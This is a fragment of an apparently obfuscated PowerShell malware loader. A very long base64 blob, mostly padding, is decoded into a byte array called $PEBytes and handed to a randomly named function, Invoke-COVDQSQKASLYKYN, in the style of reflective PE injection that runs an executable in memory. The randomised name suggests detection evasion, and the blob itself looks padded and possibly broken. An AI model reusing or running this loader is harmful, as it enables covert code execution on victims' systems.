CAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICMwPjBVMGgwMDAwMDAKMTUxMTExMTEKMjJCMl0ydDIyMgozKTNAM1wzMzMzMzMzMwo0JDQsNDQ0PDRENEw0VDRcNGQ0bDR0NHw0NDQKNTQ1TjVoNTU1NTU1CjYnNkI2XzY2Ngo3ITcxN0E3VTdlN3U3Nzc3NzchOCY4eDg4ODg4ODg4ODgKOSc5RjlQOWM5OTk5OTk5IDoKOjQ6PTpGOk86WAp2Ons6Ojo6Ojo6O087azs7OzxtPX09PT09PT09PT09PT09PT5XP3E/eT8/PyAgICAgICAgIAowJjA1MEAwSzBQMGowMAoxLDE+MUsxVzExMTExMTExIDIzMzMKND00VTQ0NDQ0NAo1aDU1UDY2NjZCN2Q3dDc3QTgwOUU5OTk5Lzo6Ojo6OjoKOzs7Ozs7Ozs7CjwiPDU8SDxVPGI8PAo7PlI+Zz4+Pj4KP0o/dz8/PyAwICAgICAKMEAwZzAwMDwxXjExMTExRjIyMjIyMgozMyQ0MjQ0NCs1UDU1NTUKNi02NDZaNn02NjY2NjYKOGo4ODg4KjlIOTk5IDoKOjI6OzpGOmM6djoKOjo6OjI7djs7Ozs7Ozs7IDwKPC48PDxOPFM8XTxiPGg8czw8cz18PT09PQo/Nz9RPz8/Pz8gQCAgICAgSDBhMDBPMWgxdzExLzIyMgo0LzRJNDQ0NDQ0NDg1PzVONVI1NTU1NQo2NTZANlk2NjY2cTc3Nzc3IDgKODg4ODg4OAo5Jjk5OT85SzlbOWE5dTk5OTlzO3k7Ozs7Owo8LDxkPH08PDw8ID0zPVo9PT1YPms+ICAgUCAgVCAgIDMzNDQ4OAo5NTlGOU85OzsKPDM8ODxVPDw8Cj1QPTk+QD5HPk4+VT4+Yz4+Pj4+PjU/bj8/PyAgIGAgICAgIAowZzAwMEwxMTEnMngyMlszdDMzMzN3NDQ0NAo1XDU1NSI2RTY2NjZIN3A3NzdeODg4OAo5LjlfOWw5dTk5OTk5ITpIOlE6WDo6OjoKOyY7QDtRO247OzsKPCBwICAgICBrMHIwMDMzMzMzMzMzCjQhNDo0STRcNGM0bTQ0NDQ0NDQ0NAo1JzUzNUM1UDVXNWQ1cDU1NTU1NTU1NQo2NDZDNlY2XTZnNjY2NjY2CjcoNzc3ZDd5Nzc3Nzc3CjkwOUU5VjliOTk5Cjo5Onk6Ojo6OjM7RTs7cDsKOzs7OzsuPD88UDw8PCAgICAgCiAgIFE4ICAgICAKICAgMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK"
[Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
Invoke-COVDQSQKASLYKYN -PEBytes $PEBytes

}
